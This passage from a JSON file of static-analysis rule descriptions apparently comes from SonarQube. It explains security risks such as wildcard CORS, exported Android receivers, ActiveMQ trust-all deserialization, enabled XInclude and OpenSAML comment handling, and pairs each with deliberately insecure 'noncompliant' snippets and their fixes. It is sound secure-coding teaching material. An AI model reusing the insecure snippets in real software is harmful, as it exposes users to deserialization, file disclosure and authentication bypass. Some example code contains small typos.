Example</h2>\n<pre>\n&lt;!-- Tomcat 7+ Cors Filter --&gt;\n&lt;filter&gt;\n  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;\n  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;\n  &lt;init-param&gt;\n    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;\n    &lt;param-value&gt;*&lt;/param-value&gt; &lt;!-- Sensitive --&gt;\n  &lt;/init-param&gt;\n&lt;/filter&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;!-- Tomcat 7+ Cors Filter --&gt;\n&lt;filter&gt;\n  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;\n  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;\n  &lt;init-param&gt;\n    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;\n    &lt;param-value&gt;https://trusted1.org,https://trusted2.org&lt;/param-value&gt; &lt;!-- Compliant --&gt;\n  &lt;/init-param&gt;\n&lt;/filter&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/346\">MITRE, CWE-346</a> - Origin Validation Error </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/942\">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
        "severity": "MINOR"
      },
      "xml:S5322": {
        "name": "Receiving intents is security-sensitive",
        "htmlDesc": "<p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led\nin the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677\">CVE-2019-1677</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275\">CVE-2015-1275</a> </li>\n</ul>\n<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will\nstart the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>\n<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications\nthat can send broadcasts to the receiver.</p>\n<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a\nbroadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a\nmessage to the receiver.</p>\n<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The data extracted from intents is not sanitized. </li>\n  <li> Intents broadcast is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See the <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;receiver android:name=\".MyBroadcastReceiver\" android:exported=\"true\"&gt;  &lt;!-- Sensitive --&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.AIRPLANE_MODE\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>Enforce permissions:</p>\n<pre>\n&lt;receiver android:name=\".MyBroadcastReceiver\"\n    android:permission=\"android.permission.SEND_SMS\"\n    android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.AIRPLANE_MODE\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</pre>\n<p>Do not export the receiver and only receive system intents:</p>\n<pre>\n&lt;receiver android:name=\".MyBroadcastReceiver\" android:exported=\"false\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.AIRPLANE_MODE\"/&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  Platform Usage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/925\">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/926\">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "xml:S5604": {
        "name": "Requesting dangerous Android permissions is security-sensitive",
        "htmlDesc": "<p>Permissions that can have a large impact on user privacy, marked as <a\nhref=\"https://developer.android.com/reference/android/Manifest.permission\">dangerous or \"not for use by third-party applications\" by Android</a>,\nshould be requested only if they are really necessary to implement critical features of an application.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> It is not sure that <code>dangerous</code> permissions requested by the application are <a\n  href=\"https://developer.android.com/training/permissions/usage-notes#avoid_requesting_unnecessary_permissions\">really necessary</a>. </li>\n  <li> The users are not <a href=\"https://developer.android.com/training/permissions/usage-notes#be_transparent\">clearly informed</a> why and when\n  dangerous permissions are requested by the application. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to carefully review all the permissions and to use <code>dangerous</code> ones only if they are really necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>In AndroidManifest.xml:</p>\n<pre>\n&lt;uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" /&gt; &lt;!-- Sensitive --&gt;\n&lt;uses-permission android:name=\"android.permission.ACCESS_MEDIA_LOCATION\" /&gt; &lt;!-- Sensitive --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n&lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /&gt; &lt;!-- Compliant --&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  Platform Usage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/250\">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li>\n  <li> <a href=\"https://developer.android.com/training/permissions/usage-notes\">developer.android.com</a> - App permissions best practices </li>\n  <li> <a href=\"https://play.google.com/about/privacy-security-deception/permissions/\">Google Play</a> - Privacy, Security, and Deception -\n  Permissions </li>\n</ul>",
        "severity": "MAJOR"
      },
      "xml:S6358": {
        "name": "Allowing application backups is security-sensitive",
        "htmlDesc": "<p>Android has a built-in backup mechanism that can save and restore application data. When application backup is enabled, local data from your\napplication can be exported to Google Cloud or to an external device via <code>adb backup</code>. Enabling Android backup exposes your application to\ndisclosure of sensitive data. It can also lead to corruption of local data when restoration is performed from an untrusted source.</p>\n<p>By default application backup is enabled and it includes:</p>\n<ul>\n  <li> Shared preferences files </li>\n  <li> Files saved in one of the paths returned by\n    <ul>\n      <li> <a href=\"https://developer.android.com/reference/android/content/Context#getDatabasePath(java.lang.String)\">getDatabasePath(String)</a>\n      </li>\n      <li> <a href=\"https://developer.android.com/reference/android/content/Context#getFilesDir()\">getFilesDir()</a> </li>\n      <li> <a href=\"https://developer.android.com/reference/android/content/Context#getDir(java.lang.String,%20int)\">getDir(String, int)</a> </li>\n      <li> <a\n      href=\"https://developer.android.com/reference/android/content/Context#getExternalFilesDir(java.lang.String)\">getExternalFilesDir(String)</a>\n      </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application backup is enabled and sensitive data is stored in local files, local databases, or shared preferences. </li>\n  <li> Your application never validates data from files that are included in backups. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Disable application backup unless it is required for your application to work properly. </li>\n  <li> Narrow the scope of backed-up files by using either\n    <ul>\n      <li> backup rules (see <code>android:fullBackupContent</code> attribute). </li>\n      <li> a custom <code>BackupAgent</code>. </li>\n      <li> the dedicated <code>no_backup</code> folder (see <code>android.content.Context#getNoBackupFilesDir()</code>). </li>\n    </ul>  </li>\n  <li> Do not back up local data containing sensitive information unless they are properly encrypted. </li>\n  <li> Make sure that the keys used to encrypt backup data are not included in the backup. </li>\n  <li> Validate data from backed-up files. They should be considered untrusted as they could have been restored from an untrusted source. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n&lt;application\n    android:allowBackup=\"true\"&gt; &lt;!-- Sensitive --&gt;\n&lt;/application&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>Disable application backup.</p>\n<pre>\n&lt;application\n    android:allowBackup=\"false\"&gt;\n&lt;/application&gt;\n</pre>\n<p>If targeting Android 6.0 or above (API level 23), define files to include/exclude from the application backup.</p>\n<pre>\n&lt;application\n    android:allowBackup=\"true\"\n    android:fullBackupContent=\"@xml/backup.xml\"&gt;\n&lt;/application&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://developer.android.com/guide/topics/data/autobackup\">Back up user data with Auto Backup</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  platform usage </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/312\">MITRE, CWE-922</a> - Insecure Storage of Sensitive Information </li>\n</ul>",
        "severity": "MAJOR"
      },
      "xml:S6359": {
        "name": "Custom permissions should not be defined in the \"android.permission\" namespace",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Defining a custom permission in the <code>android.permission</code> namespace may result in an unexpected permission assignment if a newer version\nof Android adds a permission with the same name. It is recommended to use a namespace specific to the application for custom permissions.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.organization.app\"&gt;\n\n    &lt;permission\n        android:name=\"android.permission.MYPERMISSION\" /&gt; &lt;!-- Noncompliant --&gt;\n\n&lt;/manifest&gt;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.organization.app\"&gt;\n\n    &lt;permission\n        android:name=\"com.organization.app.permission.MYPERMISSION\" /&gt;\n\n&lt;/manifest&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  Platform Usage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/265\">MITRE, CWE-265</a> - Privilege Issues </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/732\">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>\n  <li> <a href=\"https://developer.android.com/guide/topics/permissions/defining\">developer.android.com</a> - Define a Custom App Permission </li>\n</ul>",
        "severity": "MINOR"
      },
      "xml:S3281": {
        "name": "Default EJB interceptors should be declared in \"ejb-jar.xml\"",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Default interceptors, such as application security interceptors, must be listed in the <code>ejb-jar.xml</code> file, or they will not be treated\nas default.</p>\n<p>This rule applies to projects that contain JEE Beans (any one of <code>javax.ejb.Singleton</code>, <code>MessageDriven</code>,\n<code>Stateless</code> or <code>Stateful</code>).</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// file: ejb-interceptors.xml\n&lt;assembly-descriptor&gt;\n &lt;interceptor-binding&gt; &lt;!-- should be declared in ejb-jar.xml --&gt;\n      &lt;ejb-name&gt;*&lt;/ejb-name&gt;\n      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt; &lt;!-- Noncompliant; will NOT be treated as default --&gt;\n   &lt;/interceptor-binding&gt;\n&lt;/assembly-descriptor&gt;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n// file: ejb-jar.xml\n&lt;assembly-descriptor&gt;\n &lt;interceptor-binding&gt;\n      &lt;ejb-name&gt;*&lt;/ejb-name&gt;\n      &lt;interceptor-class&gt;com.myco.ImportantInterceptor&lt;/interceptor-class&gt;\n   &lt;/interceptor-binding&gt;\n&lt;/assembly-descriptor&gt;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S4684": {
        "name": "Persistent entities should not be used as arguments of \"@RequestMapping\" methods",
        "htmlDesc": "<p>With Spring, when a request mapping method is configured to accept bean objects as arguments, the framework will automatically bind HTTP parameters\nto those objects' properties. If the targeted beans are also persistent entities, the framework will also store those properties in the storage\nbackend, usually the application’s database.</p>\n<h2>Why is this an issue?</h2>\n<p>By accepting persistent entities as method arguments, the application allows clients to manipulate the object’s properties directly.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers could forge malicious HTTP requests that will alter unexpected properties of persistent objects. This can lead to unauthorized\nmodifications of the entity’s state. This is known as a <strong>mass assignment</strong> attack.</p>\n<p>Depending on the affected objects and properties, the consequences can vary.</p>\n<h4>Privilege escalation</h4>\n<p>If the affected object is used to store the client’s identity or permissions, the attacker could alter it to change their entitlement on the\napplication. This can lead to horizontal or vertical privilege escalation.</p>\n<h4>Security checks bypass</h4>\n<p>Because persistent objects are modified directly without prior logic, attackers could exploit this issue to bypass security measures otherwise\nenforced by the application. For example, an attacker might be able to change their e-mail address to an invalid one by directly setting it without\ngoing through the application’s email validation process.</p>\n<p>The same could also apply to passwords that attackers could change without complexity validation or knowledge of their current value.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a mass assignment attack because it allows modifying the <code>User</code> persistent entities thanks to\nmaliciously forged <code>Wish</code> object properties.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.persistence.Entity;\n\n@Entity\npublic class Wish {\n  Long productId;\n  Long quantity;\n  Client client;\n}\n\n@Entity\npublic class Client {\n  String clientId;\n  String name;\n  String password;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(Wish wish) { // Noncompliant\n    session.save(wish);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class WishDTO {\n  Long productId;\n  Long quantity;\n  Long clientId;\n}\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@Controller\npublic class PurchaseOrderController {\n\n  @RequestMapping(path = \"/saveForLater\", method = RequestMethod.POST)\n  public String saveForLater(WishDTO wish) {\n    Wish persistentWish = new Wish();\n    persistentWish.productId = wish.productId\n    persistentWish.quantity = wish.quantity\n    persistentWish.client = getClientById(with.clientId)\n    session.save(persistentWish);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code implements a Data Transfer Object (DTO) layer. Instead of accepting a persistent <code>Wish</code> entity as a parameter, the\nvulnerable method accepts a <code>WishDTO</code> object with a safe, minimal set of properties. It then instantiates a persistent entity and\ninitializes it based on the DTO properties' values. The resulting object can safely be persisted in the database.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\">Mass Assignment Cheat Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 - Category A8 - Software and Data\n  Integrity Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 - Category A5 - Broken Access\n  Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/915\">CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object\n  Attributes</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<p>OWASP O2 Platform Blog - <a href=\"https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf\">Two Security\nVulnerabilities in the Spring Framework’s MVC</a></p>",
        "severity": "CRITICAL"
      },
      "java:S5301": {
        "name": "\"ActiveMQConnectionFactory\" should not be vulnerable to malicious code deserialization",
        "htmlDesc": "<p>ActiveMQ can send/receive JMS Object messages (ObjectMessage in ActiveMQ context) to comply with JMS specifications. Internally, ActiveMQ relies on\nJava’s serialization mechanism for the marshaling and unmarshalling of the messages' payload.</p>\n<p>Applications should restrict the types that can be unserialized from JMS messages.</p>\n<h2>Why is this an issue?</h2>\n<p>When the application does not implement controls over the JMS object types, its clients could be able to force the deserialization of arbitrary\nobjects. This may lead to deserialization injection attacks.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers will be able to force the deserialization of arbitrary objects. This process will trigger the execution of magic unmarshalling methods on\nthe object and its properties. With a specially crafted serialized object, the attackers can exploit those magic methods to achieve malicious\npurposes.</p>\n<p>While the exact impact depends on the types available in the execution context at the time of deserialization, such an attack can generally lead to\nthe execution of arbitrary code on the application server.</p>\n<h4>Application-specific attacks</h4>\n<p>By exploiting the behavior of some of the application-defined types and objects, the attacker could manage to affect the application’s business\nlogic. The exact consequences will depend on the application’s nature:</p>\n<ul>\n  <li> Payment bypass in an e-commerce application. </li>\n  <li> Privilege escalation. </li>\n  <li> Unauthorized users' data access. </li>\n</ul>\n<h4>Publicly-known exploitation</h4>\n<p>In some cases, depending on the library the application uses and their versions, there may exist publicly known deserialization attack payloads\nknown as <strong>gadget chains</strong>. In general, they are designed to have severe consequences, such as:</p>\n<ul>\n  <li> Arbitrary code execution </li>\n  <li> Arbitrary file read or write </li>\n  <li> Server-side request forgery </li>\n</ul>\n<p>Those attacks are independent of the application’s own logic and from the types it specifies.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a deserialization injection attack because it allows the deserialization of arbitrary types from JMS\nmessages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustAllPackages(true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustedPackages(Arrays.asList(\"org.mypackage1\", \"org.mypackage2\"));\n</pre>\n<h3>How does this work?</h3>\n<p>The noncompliant code example calls the <code>setTrustAllPackages</code> method that explicitly allows the deserialization of arbitrary types. On\nthe contrary, the compliant code example, thanks to the <code>setTrustedPackages</code> method, defines a short list of classes allowed for the\ndeserialization.</p>\n<p>While defining a short list of trusted types is generally the state-of-the-art solution to avoid deserialization injection attacks, it is important\nto ensure that the allowed classes and packages can not be used to exploit the issue. In that case, a vulnerability would still be present.</p>\n<p>Note that ActiveMQ, starting with version 5.12.2, forces developers to explicitly list packages that JMS messages can contain. This limits the risk\nof successful exploitation. In versions before that one, calling the <code>ActiveMQConnectionFactory</code> constructor without further configuration\nwould leave the application at risk.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Apache ActiveMQ Documentation - <a href=\"https://activemq.apache.org/objectmessage.html\">ObjectMessage</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5254\">CVE-2015-5254</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 - Category A8 - Software and Data\n  Integrity Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 - Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S6373": {
        "name": "XML parsers should not allow inclusion of arbitrary files",
        "htmlDesc": "<p>XML standard allows the inclusion of XML files with the <code>xinclude</code> element. When an XML parser component is set up with the\n<code>http://apache.org/xml/features/xinclude</code> feature, it will follow the standard and allow the inclusion of remote files.</p>\n<h2>Why is this an issue?</h2>\n<p>When the XML parser will encounter an <code>xinclude</code> element, it will try to load the file pointed to by the <code>href</code> attribute\ninto the document. Included files can either be local files found on the file system of the application server, or remote files that are downloaded\nover HTTP, SMB, or other protocols, depending on the capabilities of the application and server.</p>\n<p>The files that can be accessed that way are only limited by the entitlement of the application on the local system and the network filtering the\nserver is subject to.</p>\n<p>This issue is particularly severe when the XML parser is used to parse untrusted documents. For example, when user-submitted XML messages are\nparsed that way.</p>\n<h3>What is the potential impact?</h3>\n<p>Allowing the inclusion of arbitrary files in XML documents can have two main consequences depending on what type of file is included: local or\nremote.</p>\n<h4>Sensitive file disclosure</h4>\n<p>If the application allows the inclusion of arbitrary files through the use of the <code>xinclude</code> element, it might be used to disclose\narbitrary files from the local file system. Depending on the application’s permissions on the file system, configuration files, runtime secrets, or\nPersonally Identifiable Information could be leaked.</p>\n<p>This is particularly true if the affected parser is used to process untrusted XML documents.</p>\n<h4>Server-side request forgery</h4>\n<p>When used to retrieve remote files, the application will send network requests to remote hosts. Moreover, it will do so from its current network\nlocation, which can have severe consequences if the application server is located on a sensitive network, such as the company corporate network or a\nDMZ hosting other applications.</p>\n<p>Attackers exploiting this issue could try to access internal backend services or corporate file shares. It could allow them to access more\nsensitive files, bypass authentication mechanisms from frontend applications, or exploit further vulnerabilities in the local services. Note that, in\nsome cases, the requests sent from the application can be automatically authenticated on federated locations. This is often the case in Windows\nenvironments when using Active Directory federated authentication.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it explicitly enables the <code>xinclude</code> feature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.SAXParserFactory;\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\n\nfactory.setXIncludeAware(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/xinclude\", true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.SAXParserFactory;\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\n\nfactory.setXIncludeAware(false);\nfactory.setFeature(\"http://apache.org/xml/features/xinclude\", false);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention\n  Cheat Sheet</a> </li>\n  <li> Java documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC\">XML External Entity Injection Attack</a> </li>\n  <li> W3C - <a href=\"https://www.w3.org/TR/xinclude-11/\">XML Inclusions (XInclude) Version 1.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 - Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 - Category A5 - Security Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Improper Restriction of XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S5679": {
        "name": "OpenSAML2 should be configured to prevent authentication bypass",
        "htmlDesc": "<p>The Security Assertion Markup Language (SAML) is a widely used standard in single sign-on systems. In a simplified version, the user authenticates\nto an Identity Provider which generates a signed SAML Response. This response is then forwarded to a Service Provider for validation and\nauthentication.</p>\n<h2>Why is this an issue?</h2>\n<p>If the Service Provider does not manage to properly validate the incoming SAML response message signatures, attackers might be able to manipulate\nthe response content without the application noticing. Especially, they might be able to alter the authentication-targeted user.</p>\n<h3>What is the potential impact?</h3>\n<p>By exploiting this vulnerability, an attacker can manipulate the SAML Response to impersonate a different user. This, in turn, can have various\nconsequences on the application’s security.</p>\n<h3>Unauthorized Access</h3>\n<p>Exploiting this vulnerability allows an attacker with authenticated access to impersonate other users within the SAML-based SSO system. This can\nlead to unauthorized access to sensitive information, resources, or functionalities the attacker should not have. By masquerading as legitimate users,\nthe attacker can bypass authentication mechanisms and gain unauthorized privileges, potentially compromising the entire system. By impersonating a\nuser with higher privileges, the attacker can gain access to additional resources. Privilege escalation can lead to further compromise of other\nsystems and unauthorized access to critical infrastructure.</p>\n<h3>Data Breaches</h3>\n<p>With the ability to impersonate other users, an attacker can gain access to sensitive data stored within the SAML-based SSO system. This includes\npersonally identifiable information (PII), financial data, intellectual property, or any other confidential information. Data breaches can result in\nreputational damage, legal consequences, financial losses, and harm to individuals whose data is exposed.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code examples are vulnerable because they explicitly include comments in signature checks. An attacker is able to change the field\nidentifying the authenticated user with XML comments.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.opensaml.xml.parse.StaticBasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  StaticBasicParserPool staticBasicParserPool = new StaticBasicParserPool();\n  staticBasicParserPool.setIgnoreComments(false); // Noncompliant\n  return staticBasicParserPool;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport org.opensaml.xml.parse.BasicParserPool;\nimport 